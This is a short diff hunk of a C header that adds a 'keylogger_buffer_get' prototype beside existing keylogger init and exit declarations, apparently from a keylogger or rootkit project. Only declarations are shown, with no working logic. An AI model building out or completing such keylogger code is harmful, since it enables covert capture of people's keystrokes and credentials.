@@ -93,6 +93,7 @@
 #define ENABLE  'e'
 #define DISABLE 'd'
 
+int keylogger_buffer_get(char *, unsigned int);
 int keylogger_init(void);
 int keylogger_exit(void);
 
